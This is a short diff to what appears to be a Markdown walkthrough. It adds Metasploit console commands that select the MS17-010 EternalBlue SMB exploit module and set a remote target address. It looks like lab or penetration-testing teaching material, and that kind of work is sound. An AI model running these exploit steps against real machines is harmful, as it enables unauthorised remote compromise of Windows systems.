@@ -43,7 +43,9 @@ msf > search ms17-010
 
 0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
 
+msf > use 0
 
+msf exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.49.135.240
 ```
 
 
